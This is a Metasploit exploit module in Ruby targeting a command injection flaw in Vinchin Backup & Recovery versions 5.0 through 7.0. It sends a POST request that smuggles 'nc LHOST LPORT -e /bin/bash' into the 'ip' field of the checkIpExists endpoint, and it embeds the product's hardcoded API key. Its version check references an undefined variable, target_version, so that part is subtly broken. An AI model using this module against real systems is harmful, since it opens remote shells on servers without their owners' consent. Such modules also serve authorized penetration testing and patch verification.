##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Vinchin Backup & Recovery Command Injection',
        'Description' => %q{
          This module exploits a command injection vulnerability in Vinchin Backup & Recovery
          v5.0.*, v6.0.*, v6.7.*, and v7.0.*. Due to insufficient input validation in the
          checkIpExists API endpoint, an attacker can execute arbitrary commands as the
          web server user.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Gregory Boddin (LeakIX)', # Vulnerability discovery
          'Valentin Lobstein', # Metasploit module
        ],
        'References' => [
          ['CVE', '2023-45498'],
          ['CVE', '2023-45499'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2023-45498'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2023-45499'],
          ['URL', 'https://blog.leakix.net/2023/10/vinchin-backup-rce-chain/'],
          ['URL', 'https://vinchin.com/'] # Vendor URL
        ],
        'DisclosureDate' => '2023-10-26',
        'Platform' => ['linux'],
        'Targets' => [
          ['Automatic', {}]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'PAYLOAD' => 'generic/shell_reverse_tcp',
          'SSL' => true
        },
        'Privileged' => false
      )
    )

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('TARGETURI', [true, 'The base path to the Vinchin Backup & Recovery application', '/api/']),
        OptString.new('APIKEY', [true, 'The hardcoded API key', '6e24cc40bfdb6963c04a4f1983c8af71'])
      ]
    )
  end

  def exploit
    print_status('Generating reverse shell command...')
    lhost = datastore['LHOST']
    lport = datastore['LPORT']
    injection_command = "nc #{lhost} #{lport} -e /bin/bash"

    print_status('Sending reverse shell payload...')
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'vars_get' => {
        'm' => '30',
        'f' => 'checkIpExists',
        'k' => datastore['APIKEY']
      },
      'data' => "p={\"ip\":\"127.0.0.1 ;#{injection_command}\"}"
    })
  end

  def check
    target_uri_path = normalize_uri(target_uri.path.split('/')[0], '/login.php')
    res = send_request_cgi('uri' => target_uri_path)

    unless res
      print_error('Failed to connect to the target.')
      return CheckCode::Unknown('Failed to connect to the target.')
    end

    print_status("HTTP Response Code: #{res.code}")
    version_pattern = /Vinchin build: (\d+\.\d+\.\d+\.\d+)/
    version_match = res.body.match(version_pattern)

    if version_match && version_match[1]
      version = version_match[1]
      print_status("Detected Vinchin version: #{version}")
      version = Rex::Version.new(version)

      vulnerable_version_patterns = [
        /^5\.0\.\d+$/,
        /^6\.0\.\d+$/,
        /^6\.7\.\d+$/,
        /^7\.0\.\d+$/
      ]

      version = Rex::Version.new(target_version)
      vulnerable = vulnerable_version_patterns.any? { |pattern| pattern.match?(version.to_s) }

      if vulnerable
        return CheckCode::Vulnerable("Detected vulnerable version: #{version}")
      else
        return CheckCode::Safe("Detected non-vulnerable version: #{version}")
      end
    else
      print_error('Unable to extract version with the regex provided.')
      return CheckCode::Unknown('Unable to extract version.')
    end
  end
end